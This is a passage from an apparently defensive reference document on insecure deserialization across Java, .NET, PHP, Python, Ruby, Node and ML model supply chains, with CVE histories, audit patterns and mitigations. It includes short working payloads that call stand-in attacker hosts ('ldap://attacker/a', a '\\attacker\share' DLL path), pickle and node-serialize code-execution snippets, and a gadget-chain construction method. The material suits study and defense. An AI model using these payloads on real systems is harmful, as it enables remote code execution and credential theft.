   setter calls `BinarySerialization.Deserialize` on the attacker-controlled bytes — full
   BinaryFormatter RCE primitive on the legacy .NET Framework targeted by SharePoint.
4. **XmlValidator allowlist bypass**: the `XmlValidator` enforces a type allowlist on
   deserialized XML, but a `System.Collections.Generic.List<ExpandedWrapper<...>>` slipped
   through — the **ExpandedWrapper** technique (previously seen in CVE-2020-1147 SharePoint
   DataSet) enables arbitrary method invocation during XML deserialization.
5. **The ViewState pivot**: once foothold is established, attackers steal the SharePoint
   `MachineKey` (validation + decryption keys) from `web.config` / `applicationHost.config` via
   the web shell, then forge signed `__VIEWSTATE` payloads for **persistent post-patch
   access** — the same primitive as CVE-2020-0688 Exchange (§ "ViewState exploitation").
   Patching SharePoint without rotating `MachineKey` leaves the post-exploitation backdoor
   live.

**Gadget chain detail:** publicly observed exploits use the **TypeConfuseDelegate** payload
from ysoserial.net for the ViewState forgery step.

**Patches:** Microsoft addressed CVE-2025-53770 / 53771 (the actively-exploited variants) in
emergency out-of-band updates for SharePoint Subscription Edition, 2019, and 2016. SharePoint
2010 and 2013 are EOL and not patched; recommend isolation / decommission. **MachineKey
rotation is required as part of remediation** — the patch alone leaves the post-exploitation
backdoor open.

Sources: `akamai.com/blog/security-research/sharepoint-vulnerability-rce-active-exploitation-detections-mitigations`,
`securelist.com/toolshell-explained/117045/`,
`unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/`,
`microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/`,
Trellix `trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/`.

### WSUS SoapFormatter (CVE-2025-59287, Wulftange, 2025)

CODE WHITE / Wulftange's late-2025 disclosure: **Microsoft WSUS unauthenticated RCE via
SoapFormatter** deserialization on the management endpoint (CVSS 9.8, CISA KEV). The endpoint
accepts a SOAP envelope whose body contains a serialized authorization cookie deserialized via
`SoapFormatter` — the same risk class as `BinaryFormatter` per the §5 taxonomy. No
authentication required, internet-exposed WSUS deployments compromised in-the-wild within
days of public PoC. The lesson reinforces the §5 taxonomy: **SoapFormatter / NetDataContractSerializer
have the same risk profile as BinaryFormatter** and any production use over an untrusted
network is critical. Microsoft's October 23 out-of-band patch removed the vulnerable code.

---

## 6. JSON/YAML Type Confusion Deserialization

### The common root cause: user-controlled type information

Muñoz and Mirosh's unifying thesis applies across all JSON/YAML deserialization vulnerabilities:
whenever a deserializer **reads a type name from the incoming data and instantiates it**, the
attacker controls what class is instantiated. This is true whether the format is JSON, YAML, AMF,
or XML. The attack surface is any deserializer in polymorphic typing mode.

### Jackson-databind: 30+ CVEs and counting

Jackson is safe when used with no polymorphic type information. It becomes exploitable when:
- `objectMapper.enableDefaultTyping()` (deprecated but common in legacy code)
- `@JsonTypeInfo(use = Id.CLASS)` annotation on a field
- `MapperFeature.USE_BASE_TYPE_AS_DEFAULT_IMPL` with certain configurations

**JdbcRowSetImpl gadget (Muñoz/Mirosh, Black Hat 2017):**
`com.sun.rowset.JdbcRowSetImpl` is in the standard JDK. JSON payload:
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/a","autoCommit":true}]
```
Jackson calls `setDataSourceName("ldap://attacker/a")` then `setAutoCommit(true)` via JavaBean
setters. `setAutoCommit()` calls `this.conn = this.connect()` → `JNDI.lookup(dataSourceName)` →
JNDI injection → (pre-8u191) remote classload RCE / (post-8u191) deserialization via LDAP.

**Blacklisting is permanently broken.** Jackson maintainers applied 30+ blacklist entries,
each triggered by a newly published gadget class. Researchers simply find the next gadget.
Correct fix: use `allowlist` (`PolymorphicTypeValidator` with explicit allowed types), or
restructure to avoid polymorphic deserialization of untrusted input.

**2024-2026 Jackson guidance shift.** The community and FasterXML maintainers have hardened
the recommended posture: `enableDefaultTyping()` is fully deprecated; `activateDefaultTyping()`
requires an explicit `PolymorphicTypeValidator` (PTV) instance; `BasicPolymorphicTypeValidator`
provides a builder for narrow allowlists (`allowIfBaseType(...)`, `allowIfSubType(...)`). In
practice, any production codebase that calls `activateDefaultTyping(LaissezFaireSubTypeValidator)`
is equivalent to the legacy `enableDefaultTyping()` — the validator name is a tell that the
author opted out of safety. Audit pattern: grep for `LaissezFaireSubTypeValidator`,
`activateDefaultTyping`, `@JsonTypeInfo(use = Id.CLASS)`, `@JsonTypeInfo(use = Id.MINIMAL_CLASS)`.
The `Id.NAME` variant with `@JsonSubTypes` enumerating concrete subtypes is the safe pattern.

Sources: FasterXML/jackson-docs polymorphic-deserialization wiki, Jackson 2.10+ release notes
on `PolymorphicTypeValidator`, GitHub issue corpus on `jackson-databind`.

### FastJSON: always vulnerable when accepting input

FastJSON resolves `@type` type discriminators via AutoType. AutoType is disabled by default but
its deny lists have been repeatedly bypassed; `safeMode` (1.2.68+) removes AutoType support
regardless of deny lists, but is not enabled by default.

### SnakeYAML: default constructor is dangerous

`new Yaml()` (default constructor) is dangerous for untrusted input **on SnakeYAML 1.x**;
`new Yaml(new SafeConstructor())` is the fix. The `!!` syntax enables arbitrary class instantiation
with constructor arguments. The URL classloader chain works on all JDKs and requires no external
gadget libraries. Any 1.x application calling `yaml.load(userInput)` with the default constructor is
exploitable. **See §3 for the SnakeYAML 2.0 behavior change (CVE-2022-1471 fix, Feb 2023): 2.0+
blocks global tags by default, so the dangerous 2.0+ patterns narrow to explicit
`setTagInspector(tag -> true)` / widened `Constructor` allowlists, or a transitive 1.x pin.**

### Liferay: JSON colon-syntax type injection (Wulftange, CVE-2020-7961)

Liferay 7.x's JSON web service API accepted parameter syntax `parameterName:typeName=value`,
where `typeName` is a fully-qualified class name passed directly to `ClassLoader.loadClass()`.
Because certain service methods accept `java.lang.Object`, `ReflectUtil.isTypeOf()` passed for
any class, enabling arbitrary instantiation with setter invocation. Pre-authentication. Fixed by
implementing class whitelisting.

The underlying pattern: **any API that accepts type names as strings and instantiates them is
a deserialization vulnerability**, even if it's not traditionally framed as "deserialization."

---

## 7. ASP.NET TemplateParser as a Gadget Surface (Wulftange, 2023)

### The mechanism

ASP.NET's `TemplateParser` tokenizes ASPX/ASCX markup, resolves control types via `@ Register`
directives, creates objects via `Activator.CreateInstance(Type)`, and populates properties via
reflection (setters, `TypeConverter.ConvertFromString()`, or `Parse(string)`). Any application
that passes user-controlled markup to `ParseControl()` or equivalent is vulnerable to arbitrary
class instantiation and property-setter invocation.

### Sitecore (CVE-2023-35813, CVSS 9.8)

Sitecore's `XamlPageHandlerFactory` (`sitecore_xaml.ashx`) allowed calling `ParseControl(string)` with user-supplied
markup. Two gadgets:

**AssemblyInstaller (direct RCE):**
```aspx
<%@ Register TagPrefix="x" Namespace="System.Configuration.Install" Assembly="..."%>
<x:AssemblyInstaller runat="server" Path="\\attacker\share\malicious.dll" />
```
Setting `Path` triggers assembly loading from a UNC/SMB path → code execution at DLL init.

**RemotingService + expression builders (data exfiltration):**
Expression builders (`<%$ ConnectionStrings:core %>`) and `HttpContext` property traversal
(`Context-Response-ContentType`) enable reading and reflecting connection strings in HTTP
responses. No code execution required for credential theft.

### SharePoint (CVE-2023-33160)

SharePoint's stricter controls required a novel bypass technique (detailed in CODE WHITE's
Part II post). Demonstrates that TemplateParser is a platform-wide attack surface in ASP.NET
applications, not specific to one product.

### Generalization

The TemplateParser attack pattern generalizes: any .NET application that calls
`Activator.CreateInstance(userControlledType)` and then populates attacker-controlled
properties on the result is exploitable. The specific gadgets are dictated by what classes
are available in the application's assemblies.

---

## 8. JMX Exploitation (Wulftange, 2023)

JMX (Java Management Extensions) endpoints are often exposed for monitoring and operations.
Wulftange documented techniques requiring no outbound connections and no application-specific MBeans:

**StandardMBean + TemplatesImpl:**
```java
StandardMBean mbean = new StandardMBean(templatesImpl, Templates.class);
mbean.getAttribute("OutputProperties");  // loads bytecode → arbitrary class execution
```
Create a `StandardMBean` wrapping a malicious `TemplatesImpl` instance remotely; invoke
`getAttribute("OutputProperties")`. No custom MBeans required; `TemplatesImpl` is in the JDK.

**RequiredModelMBean (instance methods):**
Attach any object to a `RequiredModelMBean` via `setManagedResource()`, then invoke arbitrary
public instance methods via `invoke()`. The managed resource is any serializable object the
attacker can pass.

**RequiredModelMBean (static methods):**
A `ModelMBeanOperationInfo` `Descriptor` with `class` field pointing to any class allows
invoking public static methods on that class, regardless of the managed resource. Unrestricted
static method invocation on any class available to the JVM.

**No CVEs assigned** — these techniques use JMX design features. The exposure is in deploying
unauthenticated or weakly-authenticated JMX endpoints.

---

## 9. Multi-Language Deserialization Surface

### PHP: `unserialize()` and magic methods

**Sink:** `unserialize($userInput)`

**Triggers:** Magic methods called automatically during deserialization:
- `__wakeup()` — called on deserialization
- `__destruct()` — called on garbage collection (delayed, but reliable)
- `__toString()` — called on string conversion (triggered by many objects during deserialization)
- `__get()`, `__set()`, `__call()`, `__invoke()` — triggered by property/method access

**Technique:** PHP Object Injection. Attackers construct POP (Property-Oriented Programming)
chains through framework classes. Laravel, Symfony, Magento, WordPress plugins all have
documented gadget chains.

**Tool:** `phpggc` (PHP Generic Gadget Chains) — generates serialized PHP payloads for known
framework gadget chains, analogous to ysoserial.

**The `phar://` amplifier:** Many PHP functions that accept file paths (`file_get_contents`,
`copy`, `file_exists`, `imagecreatefromgif`, etc.) trigger deserialization when given a
`phar://` URI. This converts any file-path-accepting function into a deserialization sink —
including file upload handlers that later process the uploaded path.

### Python: pickle is inherently dangerous

`pickle.loads()` (and `cPickle`, `shelve`, `marshal` with caveats) is not a safe format.

**`__reduce__` method:**
```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
pickle.loads(payload)  # executes 'whoami'
```
`pickle` calls `__reduce__()` on the class, which returns a `(callable, args)` tuple.
Pickle calls `callable(*args)`. This is arbitrary code execution by design. **Pickle cannot
be made safe for untrusted input.** It is not a sanitization problem; it is a protocol design.

See § "Python pickle in the ML era (2023-2026)" below for the model-supply-chain attack
surface, scanner-bypass corpus, and `safetensors` as the architectural escape hatch.

### Ruby: `Marshal.load()` and the universal gadget

**Sink:** `Marshal.load(userInput)`

**Key research:**
- *2013 (Charlie Somerville):* Rails gadget via `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy`
  → `ERB.new().result()` → arbitrary Ruby evaluation
- *2018 (Luke Jahnke, elttam):* **Universal RCE gadget chain** for Ruby 2.x requiring only the
  standard library — no Rails or gems. Uses standard-library classes only.
- *2021:* Extended to Ruby 2.x–3.x.
- *2024-06 (Peter Stöckli, GitHub Security Lab):* `ruby-unsafe-deserialization` PoC corpus —
  systematic PoCs spanning Marshal, YAML.unsafe_load, JSON.unsafe_load, and Ox/Oj XML across
  modern Ruby (`github.com/GitHubSecurityLab/ruby-unsafe-deserialization`). Reframes the problem
  set as language-wide rather than Marshal-specific.
- *2024-10 (Leonardo Giovannini, Doyensec):* Ruby 3.4 gadget chain published; Marshal is still
  exploitable on the then-current Ruby release.
- *2024-11-24 (Luke Jahnke):* "Ruby 3.4 Universal RCE Deserialization Gadget Chain" — extends
  his 2018 universal-gadget work to Ruby 3.4. Subsequently patched.
- *2024-12-03 (Luke Jahnke):* "Gem::SafeMarshal escape" — `Gem::SafeMarshal` (RubyGems' attempt
  at a constrained Marshal) was escapable to full RCE. The dedicated "safe" wrapper turned out
  not to be safe.
- *2025-08 (Trail of Bits retrospective, "Marshal madness"):* Synthesis of 2024-2025 Ruby gadget
  evolution. Headline framing: "Marshal is simply too dangerous to use in 2025."

The universal gadget means Ruby `Marshal.load()` of untrusted data is exploitable on any Ruby
2.x-3.x installation regardless of which gems are installed. This is the equivalent of Frohoff's
Jdk7u21 gadget for Java — requires no external dependencies beyond the runtime itself.

**Operational implication for Rails apps in 2025-2026:** session storage that round-trips via
Marshal (legacy `cookie_store` / `dalli_store` configurations), cache stores backing
`Rails.cache` with `Marshal`-coder defaults (Memcached `dalli`, some Redis configurations), and
any `ActiveJob` queue passing `GlobalID`-resolvable arguments through Marshal-coded serializers
are all reachable sinks. Brakeman's `UnsafeDeserialize` warning catches `Marshal.load`,
`YAML.load`, and `Oj.load` in the application code path; check explicitly for cache/queue/session
configurations that opt into Marshal coders since those don't surface in the application code.

**Mitigation (Ruby-side):** use `JSON.parse` over `Marshal.load`; if Marshal is unavoidable for
trusted internal IPC, sign+verify the blob with `OpenSSL::HMAC` or `ActiveSupport::MessageVerifier`
before loading. Treat `YAML.unsafe_load` as `Marshal.load` for risk purposes — it is in the same
category, not a safer alternative. `YAML.safe_load` with an empty `permitted_classes` is the
safe pattern (this is the Psych default in modern Ruby).

Sources: `blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/`,
`github.com/GitHubSecurityLab/ruby-unsafe-deserialization`, Doyensec advisory, Luke Jahnke
gadget posts (archived via Trail of Bits roundup).

### JavaScript / Node.js: function-revival deserializers

JavaScript has no built-in unsafe-deserialization sink (`JSON.parse` is data-only and does not
revive functions or instantiate classes). The risk comes from **third-party libraries that
serialize and revive functions or `eval` payloads**:

**`node-serialize` (CVE-2017-5941, CVSS 9.8, no fix):** the canonical Node deserialization RCE.
`unserialize()` honors a `_$$ND_FUNC$$_` marker that the library `eval`s as a function body. An
attacker appends a trailing `()` to make it an Immediately-Invoked Function Expression (IIFE),
so the function fires *during* deserialization rather than on later call:

```js
const serialize = require('node-serialize');
const payload =
  '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id\');}()"}';
serialize.unserialize(payload);   // executes `id` immediately
```

There is no patched version — the fix is to stop using the library for untrusted input. Sibling
libraries with the same revive-a-function design (`funcster`, `serialize-to-js` historically,
`cryo`) carry the same risk class. Audit pattern: grep for `node-serialize`, `funcster`, `cryo`,
and any `.unserialize(` / custom `reviver` that reconstructs callables.

**`JSON.parse` reviver abuse + prototype pollution.** `JSON.parse(input, reviver)` is safe unless
the reviver itself does something dangerous, but a `__proto__` / `constructor.prototype` key in
JSON is the bridge to **prototype pollution** — frequently the deserialization-adjacent root cause
of Node RCE (gadget then reached via template engines / `child_process` option objects). This is
its own bug class; see `[[reference-prototype-pollution]]` (`prototype_pollution_expertise.md`) for
the source/sink/gadget taxonomy. The connection worth holding: a "merge untrusted JSON into an
object" operation is the JS analogue of bean-property unmarshalling — attacker-controlled keys
drive writes into object structure.

**YAML in JS.** `js-yaml`'s legacy `load()` with a custom `!!js/function` schema could construct
functions; modern `js-yaml` (4.x) `load()` uses the safe schema by default and dropped
`!!js/function` support. Treat any `DEFAULT_FULL_SCHEMA` / custom-type configuration as the
dangerous form.

Sources: Snyk `security.snyk.io/vuln/npm:node-serialize:20170208`, OpsecX
`opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/`,
`github.com/swisskyrepo/PayloadsAllTheThings` (Insecure Deserialization/Node).

### Go: type-safe by design, with two real escape hatches

Go is a deliberate contrast and worth stating explicitly so triagers don't false-positive on it.
`encoding/json`, `encoding/gob`, and `encoding/xml` do **not** instantiate arbitrary types from
the payload — the destination type is fixed at the call site (`json.Unmarshal(data, &dst)`), and
`gob` requires types to be registered with `gob.Register` ahead of time. There is no
classpath-gadget equivalent. Two genuine risks remain:

- **`gopkg.in/yaml.v2` / `yaml.v3`** are data-only by default (no arbitrary-type instantiation),
  so RCE-by-deserialization is not the Go YAML risk; the risk is **billion-laughs / alias-bomb
  DoS** on untrusted YAML (mitigate with input size limits and `yaml.v3`'s alias guards).
- **`encoding/gob` with `interface{}` fields** plus careless `gob.Register` of dangerous concrete
  types can let the wire pick which registered type fills an interface — a much weaker analogue of
  polymorphic typing, bounded entirely by what was registered. Audit for `gob` decoding of
  untrusted network data into `interface{}` targets.

### Python pickle in the ML era (2023-2026)

The ML model-supply-chain has turned `pickle.loads()` from a niche RPC sink into a mass-volume
attack surface. PyTorch checkpoints (`.pt` / `.pth` / `.bin`), `joblib` scikit-learn artifacts,
TensorFlow Keras `.h5` / SavedModel containing `Lambda` layers, and Hugging Face Hub repos all
ship pickle by default for non-tensor metadata. Cross-link:
`adversarial_ml_model_security_expertise.md` for the model-weight-tampering and training-pipeline
angles; this section covers the deserialization primitive specifically.

#### `torch.load` is RCE on untrusted input

`torch.load(path)` invokes `pickle.Unpickler.load()` on the contained data. Any `torch.load`
call sourced from an untrusted location — a model card, an HTTP URL, a forked HF repo — is
arbitrary code execution. The ProtectAI / Hugging Face scan partnership reported 352,000
unsafe/suspicious issues across 51,700 models in the first six months of 2024-2025 scanning
4.47M unique model versions in 1.41M repositories — pickle bytes embedded in `.bin` model
weights remain the dominant primitive (HF blog `huggingface.co/blog/pai-6-month`, 2025-04).

PyTorch's `weights_only=True` (default in 2.6+) is the in-place hardening: it
restricts the unpickler to a curated allowlist of tensor / `OrderedDict` types via a custom
`Unpickler` subclass. **This is not a complete fix** — researchers have demonstrated
edge-case bypasses around the allowlist, and `weights_only=False` is still required for
checkpoints that legitimately embed Python objects (Lambda layers, custom loss functions),
which is a common pattern in research repos.

#### The PickleScan zero-day cluster (JFrog Security Research, 2025)

PickleScan (`github.com/mmaitre314/picklescan`) is the de-facto static scanner adopted by
Hugging Face and the broader ML supply-chain tooling stack. Four critical bypasses were disclosed in 2025
(CVE-2025-1716 by Sonatype, the rest by JFrog) that collectively rendered scanner-only defenses unreliable:

| CVE | Bypass | Mechanism |
|---|---|---|
| **CVE-2025-1716** | `pip.main` not on unsafe-globals list | `pip.main(["install", "malicious-package"])` from a pickle stream installs an arbitrary PyPI package on `torch.load`. Picklescan looked for `os.system` / `subprocess` but missed legitimate-looking package-manager APIs. Fixed in picklescan 0.0.21 by adding `pip` to the unsafe-globals set. |
| **CVE-2025-10155** (CVSS 9.3) | File-extension mismatch | A `.bin` / `.pt` file containing a raw pickle (not the expected ZIP-archive PyTorch container) is parsed by picklescan as PyTorch and fails parse — silent skip. `torch.load` identifies file format by **content**, not extension, and loads the pickle successfully. |
| **CVE-2025-10156** (CVSS 9.3) | ZIP CRC mismatch | Deliberately bad-CRC ZIP entries cause picklescan's `zipfile` parsing to raise an exception (= no findings). PyTorch tolerates CRC errors and loads the model anyway. |
| **CVE-2025-10157** (CVSS 9.3) | Submodule import bypass | PickleScan exact-matches blocked module names against a string list. `asyncio.unix_events._UnixSubprocessTransport._start` (a real submodule entry point on Linux) is not on the list; loading instantiates the subprocess transport → arbitrary command execution. The PoC pickle filename in the JFrog advisory is `asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl`. |

**The architectural lesson:** static blacklist scanners over a Turing-complete protocol are
the same losing arms race as Jackson's `@JsonTypeInfo` blacklist (§6). The fix is structural —
adopt safetensors for weights and treat any remaining pickle artifact as code-equivalent — not
"scan harder."

Sources: `research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/`,
`research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/`,
`research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/`,
`jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/`, GitHub advisory
GHSA-655q-fx9r-782v.

#### The nullifAI Hugging Face campaign (2024-2025)

ReversingLabs reported a class of malicious HF uploads dubbed **nullifAI**
(ReversingLabs branding). Tactics observed:

- Pickle payloads compressed with **7-Zip** rather than the ZIP default — PickleScan's older
  versions only inspected ZIP-archived pickle and silently skipped 7z containers.
- **Malicious code prepended** at the head of the pickle byte stream so that scanners scanning
  for trailing opcodes miss it; pickle's VM honors the bytes in stream order.
- Repository names mimicking legitimate releases (HiddenLayer's 2026 "Privacy Filter"
  impersonation campaign, ~244k reported downloads, six more repositories sharing the same
  loader — see `thehackernews.com` 2026 coverage).
- Backdoors that beacon out only on import, evading sandbox detonation that loads the model
  without invoking forward pass.

Cross-link: `cicd_supply_chain_expertise.md` for CI-pipeline implications (pickle in MLflow
artifact stores, DVC pipelines, model registries with pull-through caches).

#### HiddenLayer "Silent Sabotage": safetensors-conversion hijack (2024)

HiddenLayer Research disclosed a supply-chain pivot through Hugging Face's **safetensors
conversion bot**. The bot accepts community-submitted "convert this pickle model to safetensors"
PRs, runs the conversion in HF infrastructure (which executes the pickle as part of conversion),
and proposes a PR with the converted weights. A malicious pickle that runs at conversion time
can:

- Open a foothold inside HF's conversion infrastructure (initial 2024 finding).
- Backdoor the converted artifact (the resulting "safetensors" file's structure is constrained,
  but the conversion runner's environment can be used to commit malicious PR bodies / metadata
  / config files alongside the conversion).

**Architectural takeaway:** *converting* a pickle to safetensors via an automated bot is
itself a pickle-deserialization sink. Conversion must happen in a sandboxed, no-egress,
no-write-to-source environment.

Source: `hiddenlayer.com/research/silent-sabotage`.

#### `safetensors` as the defensive primitive

`safetensors` (Hugging Face, 2022; Trail of Bits audit May 2023) is a length-prefixed binary
format for tensors only — no callable serialization, no class instantiation, no opcode VM. The
audit (commissioned by EleutherAI + HF + Stability AI) found no critical RCE; minor issues
(polyglot file ambiguity, spec imprecision, test-suite gaps) were fixed in audit follow-up.
Written in Rust, parsed via length-checked memory mapping. Subsequent adoption:

- HF defaults to safetensors for new uploads (2023-2024).
- Diffusers, transformers, vLLM, llama.cpp accept safetensors as first-class input.

**Operational stance for 2026:** treat the presence of a `.bin` / `.pt` / `.pkl` pickle artifact
in an ML supply chain the same way you'd treat a `.exe` from an unsigned vendor — code first,
data never. If a model ships only pickle weights, refuse it, or only load with `weights_only=True`
inside a no-network sandbox (gVisor, Firecracker, or a no-egress container) and treat the
output as untrusted.

Sources: `blog.eleuther.ai/safetensors-security-audit/`,
`huggingface.co/blog/safetensors-security-audit`,
Trail of Bits report `huggingface.co/datasets/safetensors/trail_of_bits_audit_repot/`.

#### Other ML-adjacent pickle sinks worth auditing

- **`joblib.load`** — scikit-learn's canonical persistence; thin wrapper over pickle with
  memory-mapped tensor optimization. Same RCE properties as `pickle.load`.
- **TensorFlow Keras `.h5` / SavedModel** — `Lambda` layers serialize a `marshal`-encoded
  Python callable. `tf.keras.models.load_model` of a malicious model with a `Lambda` layer is
  RCE. ProtectAI tracks this as a top-three risk alongside PyTorch pickle.
- **MLflow `pyfunc` flavor** — models can ship arbitrary `python_function` modules; load is
  effectively `importlib` of attacker-controlled paths.
- **DVC remote `pull`** — fetched artifacts may be pickle; pull-then-load is the sink.
- **Hugging Face `transformers.from_pretrained(trust_remote_code=True)`** — orthogonal but
  related: `trust_remote_code=True` allows fetching and executing arbitrary `*.py` code from
  the model repo as part of `AutoModel.from_pretrained()`. Not pickle, but the same trust
  failure mode in the same supply chain. Default is `False` since 2023; finding any production
  call site with `trust_remote_code=True` over user-influenced model IDs is a critical finding.

#### Scanner-stacking is not defense in depth

PickleScan + ProtectAI Guardian + ReversingLabs + JFrog stacked do not constitute a
defense-in-depth pickle posture. They constitute four independent blacklist-based scanners
over a Turing-complete format, each of which has been bypassed and will be again. The PickleScan
zero-day cluster (CVE-2025-1716 / -10155 / -10156 / -10157) demonstrates each scanner's
exposure to its own corpus of blacklist gaps. The architectural fix remains: **don't deserialize
untrusted pickle, full stop**. Adopt safetensors, sandboxed conversion, and signed model
provenance (Sigstore for ML — see `supply_chain_provenance_expertise.md`).

---

## 10. Gadget Chain Construction Methodology

### Step 1: Find the sink

Identify where untrusted data is passed to a deserialization function:
- **Java:** `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`, `Yaml.load()` (SnakeYAML
  default), `objectMapper.readValue(untrusted, type)` with default typing, `XStream.fromXML()`,
  `Hessian2Input.readObject()`, `BlazeDS.deserialize()`
- **.NET:** `BinaryFormatter.Deserialize()`, `SoapFormatter.Deserialize()`,
  `NetDataContractSerializer.ReadObject()`, `LosFormatter.Deserialize()`,
  `JsonConvert.DeserializeObject<T>(untrusted, new JsonSerializerSettings { TypeNameHandling = ... })`
- **PHP:** `unserialize($input)`, `phar://` paths
- **Python:** `pickle.loads(input)`, `yaml.load(input)` (pyyaml default), `shelve`,
  `torch.load(untrusted)`, `joblib.load(untrusted)`, `tf.keras.models.load_model` (Lambda layer)
- **Ruby:** `Marshal.load(input)`, `YAML.unsafe_load(input)`, `Oj.load(input)` (default mode)
- **JavaScript/Node:** `require('node-serialize').unserialize(input)`, `funcster`/`cryo`,
  `js-yaml` `load()` with a full/custom schema, untrusted-JSON merge → prototype pollution

Use CodeQL taint analysis (Muñoz's methodology) for systematic discovery: model network input as
a taint source, track through deserialization APIs as sinks.

### Step 2: Identify entry classes

For Java ObjectInputStream: any class on the classpath implementing `Serializable` with a
`readObject()`, `readResolve()`, or `finalize()` method.

For bean-property marshallers: any class with a no-arg public constructor and public setter
methods that perform interesting operations.

For .NET BinaryFormatter: any class implementing `ISerializable` or decorated with `[Serializable]`.

### Step 3: Find trigger methods — the collection rebuilding trick

Many gadget chains exploit the fact that Java collection classes (`HashMap`, `HashSet`,
`PriorityQueue`, `TreeSet`) call methods on their elements during deserialization as they
rebuild internal state:

- `HashMap.readObject()` calls `hash(key)` → `key.hashCode()` on every key
- `HashSet` calls `hashCode()` and `equals()` on elements
- `PriorityQueue.readObject()` calls `compareTo()` (or custom `Comparator.compare()`) to restore
  heap order
- `TreeMap.readObject()` calls `compareTo()` via the `Comparator`

These callbacks are reliable, framework-provided triggers that fire before any application code
sees the deserialized object. A gadget that responds to `hashCode()`, `equals()`, `compareTo()`,
or `toString()` invocations can chain into a dangerous operation without needing a
`readObject()` implementation on the entry class.

### Step 4: Reach a dangerous terminal primitive

**In Java:**
- `Runtime.exec(command)` via `InvokerTransformer` reflection
- `TemplatesImpl.getOutputProperties()` → loads `_bytecodes` → arbitrary class execution
  (bytecode must be a class extending `AbstractTranslet` in the JDK internal implementation)
- `JNDI.lookup(attacker_url)` via `JdbcRowSetImpl.setAutoCommit()` or similar
- `ProcessBuilder.start()`, `ScriptEngine.eval()`, `JShell.eval()` (modern JDK alternative)

**In .NET:**
- `Process.Start(command)` via `ObjectDataProvider.QueryWorker()`
- Arbitrary DLL load via `AssemblyInstaller.Path` property
- XAML execution via `XamlReader.Parse()`
- File write via `FileSystemInfo`, `StreamWriter` gadgets → then trigger via auto-load

### Step 5: Serialize and deliver

Construct the gadget chain object graph in memory, then serialize using the target format.

For Java: `ObjectOutputStream.writeObject(chain)` → produces `0xACED 0x0005` prefixed bytes.
For detection probes: always start with URLDNS payload to confirm the sink exists without RCE.
For blind sinks: use out-of-band channels (DNS via URLDNS / JNDI, HTTP via WebClient gadgets).

### CodeQL-based systematic discovery (Muñoz / GitHub Security Lab)

For large or complex codebases, manual source review misses deserialization sinks. Muñoz's
methodology at GitHub Security Lab:

1. **Extend `RemoteFlowSource`** in CodeQL to model framework-specific taint sources:
   Netty `ChannelInboundHandler.channelRead()`, `ByteToMessageDecoder.decode()`, Spring MVC
   request bodies, etc.
2. **Model deserialization functions as sinks:** `ObjectInputStream.readObject()`, `Yaml.load()`,
   framework-specific deserialization calls
3. **Taint-track** through codec → deserialization → object construction
4. **Find variants** by looking for all callers of the pattern found in one component (Apache Dubbo
   research found 9 separate Hessian deserialization paths via this method)

---

## 11. Defense Principles

### Don't deserialize untrusted data — the only reliable fix

Frohoff stated this directly in the AppSecCali slides and it has been validated by every
subsequent researcher: the correct fix for Java deserialization vulnerabilities is architectural
— do not pass untrusted data to `ObjectInputStream.readObject()`. All other mitigations are
incomplete.

Where business requirements demand deserialization of untrusted data:
- **Use an allowlist filter (JEP 290)** specifying exactly which classes are permitted
- **Sign the serialized blob** with a key the client cannot obtain — verify before deserializing
- **Use a safe format** (Protocol Buffers, MessagePack, Avro) with no type discrimination

### Allowlist over blacklist — blacklisting is permanently broken

Bechler and Muñoz both documented this independently. Jackson's blacklist accumulated 30+ entries.
JNDI patches blocked RMI codebase, then LDAP codebase, with attacks via local classpath still
working. Blacklisting is an adversarial arms race where the defender always reacts to the last
attack. An allowlist that specifies the exact set of expected types closes the class permanently.

### TypeNameHandling: treat as dangerous as BinaryFormatter

In .NET, `TypeNameHandling != None` in Json.Net settings is a high-severity configuration
vulnerability. It should be treated like enabling BinaryFormatter — requiring explicit security
review and, usually, rejection. The presence of `TypeNameHandling.Auto` in a codebase is a
finding, not a configuration preference.

### JNDI injection: defense in depth

Defense against JNDI injection requires multiple layers because patches have been incremental:
1. Upgrade Java to 8u191+ (blocks LDAP codebase loading)
2. Set `com.sun.jndi.ldap.object.trustURLCodebase=false` (explicit, don't rely on defaults)
3. Disable `com.sun.jndi.rmi.object.trustURLCodebase=false` (also explicit)
4. These do NOT protect against local-classpath factory attacks or deserialization via LDAP
5. Patch the **application** that passes user input to JNDI — that is the actual vulnerability

### Serialization binder: necessary but not sufficient

For .NET, a custom `SerializationBinder` on BinaryFormatter reduces risk but, per Wulftange's
research, is bypassable when `BindToType()` can be made to return `null` (via AQN manipulation).
The binder is a defense-in-depth measure, not a reliable standalone control. The reliable fix
remains: stop using BinaryFormatter.

### AI-agent and LLM-tool-output deserialization (2024-2026)

LLM agents extend the deserialization attack surface in two distinct ways that didn't exist
when this doc was originally authored:

**1. Pickle in the model supply chain.** Covered in detail in §9 "Python pickle in the ML era."
Summary: any `torch.load` / `joblib.load` / `tf.keras.models.load_model` call sourced from a
model registry, Hugging Face Hub, S3 bucket fed by training pipelines, or fine-tune output
directory is a deserialization sink with the same risk profile as `pickle.loads(network_input)`.
Treat `weights_only=True` as risk reduction, not a fix; treat safetensors as the architectural
fix.

**2. Agent tool-output deserialization.** When an LLM agent runs a tool (web fetch, code
execution, vector retrieval, DB query) and parses the result back into the agent loop, that
parse step is a deserialization decision. Common patterns observed in production agent
frameworks (LangChain, LlamaIndex, AutoGen, Pydantic AI, Anthropic's Computer Use agent):

| Pattern | Risk |
|---|---|
| `json.loads(tool_output)` into untyped `dict` | Low; risk shifts to downstream consumers |
